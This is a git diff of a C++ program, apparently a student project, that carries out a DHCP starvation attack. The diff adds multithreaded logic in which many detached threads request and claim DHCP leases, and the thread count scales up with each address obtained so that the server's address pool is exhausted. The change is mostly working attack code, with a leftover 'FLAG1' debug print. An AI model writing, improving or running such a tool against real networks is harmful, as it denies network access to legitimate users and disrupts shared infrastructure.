@@ -1,43 +1,55 @@
 #include "include/pds-dhcpstarve.h"
 #include "include/pds-dhcpCore.h"
-//#include "include/pds-RawSocketHelper.h"
 
-// 12 bytes pseudo header for udp checksum calculation
-/*struct pseudoUDPHeader
+std::mutex socketMutex, threadNumberMutex, errorCounter;// ipAddressMutex;
+int volatile threadCounter = 0;
+int volatile currentThreadCountMax = MAX_THREADS_COUNT;
+int volatile errorCount = 0;
+
+bool volatile sigIntCatched = false;
+
+int currentErrorCount(int value = 1)
 {
-	uint32_t source_address;
-	uint32_t dest_address;
-	uint8_t placeholder;
-	uint8_t protocol;
-	uint16_t udp_length;
-};
+	std::lock_guard<std::mutex> guard(errorCounter);
+	errorCount += value;
 
-// checksum calculation function
-unsigned short csum(unsigned short *ptr, int nbytes)
+	return errorCount;
+}
+
+int getNumberOfThreads()
 {
-	register long sum;
-	unsigned short oddbyte;
-	register short answer;
+	std::lock_guard<std::mutex> guard(threadNumberMutex);
+	return threadCounter;
+}
 
-	sum = 0;
-	while (nbytes>1) {
-		sum += *ptr++;
-		nbytes -= 2;
+int freeThreadsToMaxCount()
+{
+	std::lock_guard<std::mutex> guard(threadNumberMutex);
+	int ret = 0;
+	if (threadCounter < currentThreadCountMax)
+	{	
+		ret = currentThreadCountMax - threadCounter;
+		threadCounter = currentThreadCountMax;
 	}
-	if (nbytes == 1) {
-		oddbyte = 0;
-		*((u_char*)&oddbyte) = *(u_char*)ptr;
-		sum += oddbyte;
-	}
+	return ret;
+}
 
-	sum = (sum >> 16) + (sum & 0xffff);
-	sum = sum + (sum >> 16);
-	answer = (short)~sum;
+void decreaseThreadCounter(int value = 1)
+{
+	std::lock_guard<std::mutex> guard(threadNumberMutex);
+	threadCounter -= value;
+}
 
-	return(answer);
-}*/
+void addToMaxThreadCount(int value)
+{
+	std::lock_guard<std::mutex> guard(threadNumberMutex);
+	currentThreadCountMax += value;
+	if(currentThreadCountMax < 1)	// at least 1 thread is always available
+		currentThreadCountMax = 1;
+	if(currentThreadCountMax > MAX_THREADS_COUNT)	// do not go over max thread limit
+		currentThreadCountMax = MAX_THREADS_COUNT;
+}
 
-std::mutex socketMutex, threadNumberMutex, ipAddressMutex;
 
 int sendMessage(int socket, char* message, int messageLength, sockaddr* serverSettings)
 {
@@ -62,17 +74,18 @@ int tryGetMessage(int socket, char* message, int &messageLength, uint32_t xid)
 }
 
 
-int dhcpStarveClient(int socket, struct sockaddr_in &serverSettings)
+void dhcpStarveClient(int socket, struct sockaddr_in &serverSettings, int threadNumber)
 {
 	// create instance of dhcp starve core class
-	DHCPCore* dhcpCoreInstance = new DHCPCore();
+	DHCPCore* dhcpCoreInstance = new DHCPCore(threadNumber);
 	// create DHCP Discover message
 	dhcpCoreInstance->createDHCPDiscoverMessage();
 	if (dhcpCoreInstance->isError())
 	{
+		std::cout << "FLAG1" << std::endl;
 		// error occured tidy up and exit
 		delete(dhcpCoreInstance);
-		return(1);
+		return;
 	}
 	// send message
 	//sendto(senderSocket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), 0, (sockaddr*)&serverSettings, sizeof(serverSettings));
@@ -87,6 +100,14 @@ int dhcpStarveClient(int socket, struct sockaddr_in &serverSettings)
 	// wait for DHCPOFFER	
 	while(true)
 	{
+		// check if SIGINT
+		if(sigIntCatched)
+		{
+			delete(dhcpCoreInstance);
+			fprintf(stdout, "Catched SIGINT, terminating thread: %d.\n", threadNumber);
+			decreaseThreadCounter();
+			return;
+		}
 		std::memset(&message, 0, sizeof(message));
 		int forMe = tryGetMessage(socket, &message[0], messageLength, dhcpCoreInstance->getCurrentXID());
 		if(forMe)
@@ -99,7 +120,8 @@ int dhcpStarveClient(int socket, struct sockaddr_in &serverSettings)
 				{
 					// error occured tidy up and exi
 					delete(dhcpCoreInstance);
-					return(1);
+					decreaseThreadCounter();
+					return;
 				}
 				sendMessage(socket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), (sockaddr*)&serverSettings);
 			}
@@ -110,13 +132,21 @@ int dhcpStarveClient(int socket, struct sockaddr_in &serverSettings)
 				{
 					// error occured tidy up and exi
 					delete(dhcpCoreInstance);
-					return(1);
+					decreaseThreadCounter();
+					return;
 				}
 				// check if ack obtained
 				if(dhcpCoreInstance->getState() == DHCP_TYPE_ACK)
 				{
-					fprintf(stdout, "IP address blocked!\n");
-					break;
+					uint32_t ipAddr = dhcpCoreInstance->getOfferedIPAddress();
+					char str[INET_ADDRSTRLEN];
+					inet_ntop(AF_INET, &ipAddr, str, INET_ADDRSTRLEN);
+					fprintf(stdout, "Thread %d:IP address:%s, obtained!\n", threadNumber, str);
+					// successful, increase the number of threads
+					addToMaxThreadCount(1);
+					delete(dhcpCoreInstance);
+					decreaseThreadCounter();
+					return;
 				}
 			}
 		}
@@ -126,23 +156,38 @@ int dhcpStarveClient(int socket, struct sockaddr_in &serverSettings)
 		if(ms.count() > WAIT_FOR_RESPONSE_TIME)
 		{
 			fprintf(stderr, "Time out for offer!\n");
+			currentErrorCount(1);
+			// time out, decrease the number of threads
+			addToMaxThreadCount(-1);
 			delete(dhcpCoreInstance);
-			return(1);
+			decreaseThreadCounter();
+			return;
 		} 
 		// sleep for a while
 		std::this_thread::sleep_for(std::chrono::milliseconds(WAIT_BEFORE_CHECK_SOCKET_AGAIN));
 	}
 
 	// clean and exit thread
-
 	delete(dhcpCoreInstance);
-	return(1);
+	decreaseThreadCounter();
+	return;
 }
 
-
+void sigIntSet(int s)
+{
+	if (s == SIGINT)
+		sigIntCatched = true;
+}
 
 int main(int argc, char* argv[])
 {
+	// ctrl + c signal catching set
+	struct sigaction sigIntHandler;
+	sigIntHandler.sa_handler = sigIntSet;
+	sigemptyset(&sigIntHandler.sa_mask);
+	sigIntHandler.sa_flags = 0;
+	sigaction(SIGINT, &sigIntHandler, NULL);
+
 	// parse the parameters using getopt
 	std::string chosenInterface = "";
 	int c;
@@ -231,7 +276,33 @@ int main(int argc, char* argv[])
 	}
 
 	// --------------------------- COMMUNICATION START -------------------------------------------------
-	int ret = dhcpStarveClient(senderSocket, serverSettings);
+	//int ret = dhcpStarveClient(senderSocket, serverSettings);
+	int threadNumber = 0;
+	while(currentErrorCount(0) < STOP_TIMEOUT_LIMIT || STOP_TIMEOUT_LIMIT == -1)
+	{
+		if(sigIntCatched)
+		{
+			break;
+		}
+		int threadAvailable = freeThreadsToMaxCount();
+		for (auto i = 0; i < threadAvailable; ++i)
+		{
+			std::thread(dhcpStarveClient, senderSocket, std::ref(serverSettings), ++threadNumber).detach();
+		}
+		// sleep for two seconds
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+	}
 
-	exit(ret);
+	// wait until all threads are finished, to not close socket before they react on SIGINT
+	while(true)
+	{
+		if(getNumberOfThreads() <= 0)
+		{
+			close(senderSocket);
+			fprintf(stdout, "Terminating main thread, closing socket.\n");
+			break;
+		}
+	}
+
+	exit(0);
 }
